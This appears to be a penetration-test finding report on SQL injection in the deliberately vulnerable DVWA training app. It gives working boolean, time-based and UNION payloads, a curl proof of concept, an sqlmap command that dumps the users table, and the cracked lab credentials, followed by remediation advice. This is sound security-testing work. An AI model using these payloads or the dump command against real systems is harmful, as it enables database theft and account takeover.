# DVWA SQL Injection: /DVWA/vulnerabilities/sqli/ 'id' parameter (authenticated, security=low) enables database exfiltration and account takeover

**ID:** vuln-0002
**Severity:** CRITICAL
**Found:** 2025-10-22 16:07:07 UTC

## Description

Summary
A critical SQL Injection vulnerability exists in the DVWA module at:
GET http://192.168.13.214/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit
Affected parameter: id (GET)
Authentication context: Authenticated user session required; DVWA security level set to Low.
Impact: Full database exfiltration of the dvwa database including user password hashes; cracked credentials enable account takeover (validated for admin/password via browser).

Environment and context
- Target: DVWA on 192.168.13.214
- Web server: Apache 2.4.58 on Ubuntu (from sqlmap fingerprint)
- DBMS: MySQL (MariaDB fork), version detected by sqlmap
- Authenticated cookie used: PHPSESSID=turmqf3c4d8394e78clit57i4j; security=low
- Evidence directory: /workspace/evidence
  - /workspace/evidence/sqlmap_dbs.txt
  - /workspace/evidence/sqlmap_enum.txt
  - /workspace/evidence/sqlmap_dump_users.txt
  - /workspace/evidence/sqlmap_output/192.168.13.214/dump/dvwa/users.csv
  - /workspace/evidence/sqli_evidence.json

Verified injection techniques
1) Boolean-based
   - True predicate:
     id=1' OR '1'='1
     Result: Page returns multiple result rows (pairs_count increased from baseline 1 to 5). Evidence: sqli_evidence.json → boolean_true pairs; python timing baseline vs true/false.
   - False predicate:
     id=1' AND '1'='2
     Result: No result rows (pairs_count 0) while HTTP 200. Evidence: sqli_evidence.json → boolean_false.

2) Time-based blind
   - Payload:
     id=1' AND SLEEP(3)#
   - Observation: Response delayed ≈3.0 seconds (time-based: 3.018s). Evidence: sqli_evidence.json → time_based.

3) Error-based
   - sqlmap confirmed MySQL error-based technique:
     MySQL >= 5.0 AND error-based - WHERE/HAVING... (FLOOR)
   - Evidence: sqlmap_dbs.txt and sqlmap_enum.txt show detected payloads and title.

4) UNION-based
   - Payloads:
     id=1' UNION SELECT user, password FROM users#
     id=1' UNION ALL SELECT user, password FROM users# 
     id=1' UNION SELECT user, password FROM users-- -
   - Result: Inline disclosure of usernames and MD5 hashes in application response:
     admin 5f4dcc3b5aa765d61d8327deb882cf99
     gordonb e99a18c428cb38d5f260853678922e03
     1337 8d3533d75ae2c3966d7e0d4fcc69216b
     pablo 0d107d09f5bbe40cade3de5c71e9e9b7
     smithy 5f4dcc3b5aa765d61d8327deb882cf99
   - Evidence: sqli_evidence.json → union_sample; python run captured multiple user/password pairs.

DBMS fingerprint and injection summary (sqlmap)
- Injection confirmed on GET parameter id with multiple techniques:
  - OR boolean-based blind (NOT)
  - MySQL AND error-based (FLOOR)
  - MySQL AND time-based blind (SLEEP)
  - Generic UNION query (2 columns)
- DBMS: MySQL (MariaDB fork)
- Current database: dvwa
- Current user: dvwa@localhost (not DBA)
- Available databases: dvwa, information_schema
- Evidence: /workspace/evidence/sqlmap_dbs.txt and /workspace/evidence/sqlmap_enum.txt

Full data exfiltration (sqlmap)
Command used (authenticated with cookies):
sqlmap -u "http://192.168.13.214/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=turmqf3c4d8394e78clit57i4j; security=low" --batch -D dvwa -T users --dump --output-dir=/workspace/evidence/sqlmap_output -v 1

Dumped table: dvwa.users (5 entries)
- Columns: user_id, role, user, avatar, password, last_name, first_name, last_login, failed_login, account_enabled
- Sample rows (hashes with plaintext as present in DVWA):
  admin 5f4dcc3b5aa765d61d8327deb882cf99 (password)
  gordonb e99a18c428cb38d5f260853678922e03 (abc123)
  1337 8d3533d75ae2c3966d7e0d4fcc69216b (charley)
  pablo 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)
  smithy 5f4dcc3b5aa765d61d8327deb882cf99 (password)
Evidence:
- /workspace/evidence/sqlmap_dump_users.txt
- /workspace/evidence/sqlmap_output/192.168.13.214/dump/dvwa/users.csv

Credential cracking and verification
- Hash type: Unsalted MD5 (raw)
- Cracked credentials (from app output and standard wordlist knowledge):
  admin : password
  gordonb : abc123
  pablo : letmein
  smithy : password
  1337 : charley
- Verification: Successful browser login demonstrated using admin/password (navigated to DVWA index with authenticated menu; screenshot state observed during validation). This confirms real-world account takeover from SQLi-exfiltrated data.
- Note: Programmatic login attempts without CSRF token varied by context, but browser-based login succeeded, proving impact.

Reproduction steps (manual PoC)
1) Login to DVWA and set security to Low.
2) Navigate to SQL Injection module: /DVWA/vulnerabilities/sqli/
3) Baseline request:
   GET /DVWA/vulnerabilities/sqli/?id=1&Submit=Submit
4) Boolean-based PoC:
   GET /DVWA/vulnerabilities/sqli/?id=1'%20OR%20'1'%3D'1&Submit=Submit
   Observation: Multiple user rows returned.
   GET /DVWA/vulnerabilities/sqli/?id=1'%20AND%20'1'%3D'2&Submit=Submit
   Observation: Zero rows.
5) Time-based PoC:
   GET /DVWA/vulnerabilities/sqli/?id=1'%20AND%20SLEEP(3)%23&Submit=Submit
   Observation: ~3s response delay.
6) UNION-based PoC to dump users:
   GET /DVWA/vulnerabilities/sqli/?id=1'%20UNION%20SELECT%20user,%20password%20FROM%20users%23&Submit=Submit
   Observation: Usernames and password hashes are rendered in the response.

Example cURL (authenticated)
curl -s -i -G "http://192.168.13.214/DVWA/vulnerabilities/sqli/" \
  --data-urlencode "id=1' UNION SELECT user, password FROM users#" \
  --data "Submit=Submit" \
  -H "Cookie: PHPSESSID=turmqf3c4d8394e78clit57i4j; security=low"

Risk and impact
- Confidentiality: High. Complete dump of application users and credentials (hashes) leading to valid credential recovery and account takeover (admin).
- Integrity: High. SQLi commonly enables data manipulation; although stacked queries were not confirmed here, attacker control over query output and potential write operations in other contexts present high risk.
- Availability: Not targeted in this exploit path.
- Business impact: Compromise of user accounts (including admin), exposure of sensitive PII if present, potential lateral movement to administrative functions, and potential chaining to other dangerous modules resulting in system compromise.

CVSS v3.1 (representative)
Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
Base Score: 8.0 (High)
Severity rationale: Despite login requirement (PR:L), the vulnerability enables full database exfiltration and administrative account takeover. Considering common industry practice, this issue warrants Critical severity for remediation prioritization.

Evidence index
- Boolean/time/union timing and result deltas: /workspace/evidence/sqli_evidence.json
- sqlmap database enumeration: /workspace/evidence/sqlmap_dbs.txt
- sqlmap user/privilege enumeration: /workspace/evidence/sqlmap_enum.txt
- sqlmap dvwa.users dump (CSV): /workspace/evidence/sqlmap_output/192.168.13.214/dump/dvwa/users.csv
- Full dump log: /workspace/evidence/sqlmap_dump_users.txt

Root cause
- The id parameter is concatenated into an SQL query without proper parameterization or strict type casting, allowing attacker-controlled SQL syntax execution.

Remediation
- Use parameterized queries (prepared statements) for all database access. Never concatenate user input into SQL strings.
- Enforce strict server-side validation and type casting: id should be validated as integer and cast server-side.
- Implement least-privilege database accounts; remove unnecessary INSERT/UPDATE/DELETE or metadata read privileges from the web user.
- Disable detailed database errors from being returned to clients.
- Add centralized input validation and output encoding policies.
- Consider a web application firewall as a compensating control to detect and block SQLi payloads, while prioritizing code fixes.
- Review and rotate any credentials exposed; force password resets for affected users; consider adding password hashing best practices (bcrypt/Argon2 with salt).

Recommendation for validation after fix
- Re-test the endpoint with union/time-based payloads and automated tools (sqlmap) to confirm no injection vectors.
- Confirm that only numeric id values are accepted and that non-numeric input is rejected or sanitized before reaching the database layer.

Timeline
- Discovery and validation completed via manual payloads and sqlmap automation; credential verification performed via browser login using exfiltrated admin/password.
